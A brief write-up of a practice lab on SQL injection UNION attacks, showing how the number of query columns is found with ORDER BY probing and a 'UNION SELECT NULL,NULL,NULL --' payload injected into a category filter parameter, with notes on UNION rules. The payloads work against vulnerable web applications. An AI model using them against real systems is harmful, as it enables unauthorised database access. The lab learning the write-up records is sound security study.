# Lab: SQL injection UNION attack, determining the number of columns returned by the query

Target : determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

Analysis:

- /filter?category=Corporate+gifts'" -> returns 500 Internal Server Error
- fuzzing the application till `Corporate+gifts'+order+by+3+--` returns 200 ok and actually changing the order of the elements
- but when i used order by 4 -> returns 500 Error -> no. of columns is 3
- `Corporate+gifts'+UNION+SELECT+NULL+,+NULL+,+NULL+--` Payload to solve the lab

Background (Union):
Rule :

- the number and the order of yhe columns must be the same in all qyeries
- The data types must be compatible

SQLi attack (way #1):
select ? from table1 UNION select NULL
-> error -> wrong number of columns
select ? from table1 UNION select NULL, NULL

- 200 ok -> correct number of columns

SQLi attack (way #2):

select a,b from table1 order by 3
-> error -> which means the correct number is the number before the number raised the error
